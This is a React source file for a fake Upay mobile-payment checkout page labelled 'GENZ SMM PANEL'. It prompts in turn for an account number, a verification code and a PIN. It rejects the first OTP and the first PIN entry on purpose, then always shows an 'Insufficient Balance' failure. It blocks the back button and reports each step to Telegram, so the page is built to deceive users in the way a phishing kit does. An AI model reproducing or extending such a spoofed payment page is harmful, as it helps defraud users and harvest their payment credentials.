import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import upayLogo from "@/assets/upay-logo-full.svg";

const UpayPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [mobileNumber, setMobileNumber] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  const [step, setStep] = useState<'mobile' | 'otp' | 'pin'>('mobile');
  const [showError, setShowError] = useState("");
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [pinAttempts, setPinAttempts] = useState(0);

  const mobileRef = useRef<HTMLInputElement>(null);
  const otpRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);

  const invoiceNumber = "12117746247398975";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount]);

  useEffect(() => {
    if (step === 'mobile') setTimeout(() => mobileRef.current?.focus(), 100);
    if (step === 'otp') setTimeout(() => otpRef.current?.focus(), 100);
    if (step === 'pin') setTimeout(() => pinRef.current?.focus(), 100);
  }, [step]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileNumber.length === 11 && validPrefixes.includes(mobileNumber.substring(0, 3)) && /^\d+$/.test(mobileNumber);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 11));
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPin(e.target.value.replace(/\D/g, "").slice(0, 6));
  };

  const handleMobileSubmit = () => {
    if (!isValidMobile()) return;
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay Number' });
    setStep('otp');
  };

  const handleOtpSubmit = () => {
    if (otp.length < 4) {
      setShowError("Please enter the verification code.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay OTP' });

    if (otpAttempts === 0) {
      setOtpAttempts(1);
      setOtp("");
      setTimeout(() => otpRef.current?.focus(), 50);
      return;
    }
    setStep('pin');
  };

  const handlePinSubmit = () => {
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay PIN' });

    if (pinAttempts === 0) {
      setPinAttempts(1);
      setPin("");
      setTimeout(() => pinRef.current?.focus(), 50);
      return;
    }
    navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
  };

  const handleClose = () => {
    navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}.00`);
  };

  const renderContent = () => {
    if (step === 'pin') {
      return (
        <>
          <p className="text-center text-[#0054A5] font-semibold text-sm mb-2">Enter your PIN</p>
          {showError && <p className="text-center text-red-500 text-[11px] mb-1">{showError}</p>}
          <input ref={pinRef} type="password" inputMode="numeric" value={pin} onChange={handlePinChange} placeholder="PIN"
            className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors bg-white" />
          <p className="text-center text-[#333] text-[11px] mt-2">By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the <span className="underline font-semibold text-[#1a1a1a]">terms & conditions</span></p>
        </>
      );
    }
    if (step === 'otp') {
      return (
        <>
          <p className="text-center text-[#0054A5] font-semibold text-sm mb-2">Enter verification code</p>
          {showError && <p className="text-center text-red-500 text-[11px] mb-1">{showError}</p>}
          <input ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange} placeholder="Verification code"
            className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors bg-white" />
          <p className="text-center text-[#333] text-[11px] mt-2">By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the <span className="underline font-semibold text-[#1a1a1a]">terms & conditions</span></p>
        </>
      );
    }
    const mobileValid = isValidMobile();
    return (
      <>
        <p className="text-center text-[#0054A5] font-semibold text-sm mb-2">Enter Your upay Account Number</p>
        {showError && <p className="text-center text-red-500 text-[11px] mb-1">{showError}</p>}
        <input ref={mobileRef} type="text" inputMode="numeric" value={mobileNumber} onChange={handleMobileChange} placeholder="e.g 01XXXXXXXXX"
          className="w-full border border-[#ccc] rounded-full px-3 py-2 text-center text-sm outline-none focus:border-[#0054A5] transition-colors bg-white" />
        <p className="text-center text-[#333] text-[11px] mt-2">By clicking on <span className="font-bold">Confirm,</span> you are agreeing to the <span className="underline font-semibold text-[#1a1a1a]">terms & conditions</span></p>
      </>
    );
  };

  const mobileValid = isValidMobile();
  const handleSubmit = step === 'mobile' ? handleMobileSubmit : step === 'otp' ? handleOtpSubmit : handlePinSubmit;
  const isDisabled = step === 'mobile' && !mobileValid;

  return (
    <div className="min-h-screen flex items-center justify-center px-4 py-4" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
      <div className="w-full max-w-[340px] rounded-2xl overflow-hidden shadow-lg" style={{ minHeight: '480px' }}>
        {/* Logo area */}
        <div className="pt-6 pb-4 flex flex-col items-center" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
          <img src={upayLogo} alt="Upay" className="w-64 h-auto object-contain" />
        </div>

        {/* White content box */}
        <div className="bg-white px-4 pt-4 pb-5">
          {/* Invoice & amount info */}
          <div className="text-center mb-4">
            <p className="font-bold text-[#1a1a1a] text-sm">GENZ SMM PANEL</p>
            <p className="text-[#555] text-[11px] mt-1">Invoice: <span className="font-bold text-[#1a1a1a]">{invoiceNumber}</span></p>
            <p className="text-[#555] text-[11px] mt-1">Amount: <span className="font-bold text-[#1a1a1a] text-sm">BDT {amount}</span></p>
          </div>

          {/* Input area */}
          <div className="mb-4">{renderContent()}</div>

          {/* Buttons */}
          <div className="flex items-center justify-between">
            <button onClick={handleClose} className="border border-[#999] rounded-md px-6 py-2 text-xs font-semibold text-[#333] bg-white hover:bg-[#f5f5f5]">Close</button>
            <button
              onClick={handleSubmit}
              disabled={isDisabled}
              className={`rounded-md px-6 py-2 text-xs font-semibold transition-colors ${isDisabled ? 'bg-[#b0b0b0] text-white cursor-not-allowed' : 'bg-[#0054A5] text-white hover:bg-[#004090]'}`}
            >Confirm</button>
          </div>
        </div>

        {/* Footer */}
        <div className="py-2 flex items-center justify-center gap-1" style={{ backgroundColor: 'rgb(235, 235, 235)' }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="#0054A5">
            <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
          </svg>
          <span className="text-[#0054A5] font-bold text-xs">16268</span>
        </div>
      </div>
    </div>
  );
};

export default UpayPayment;
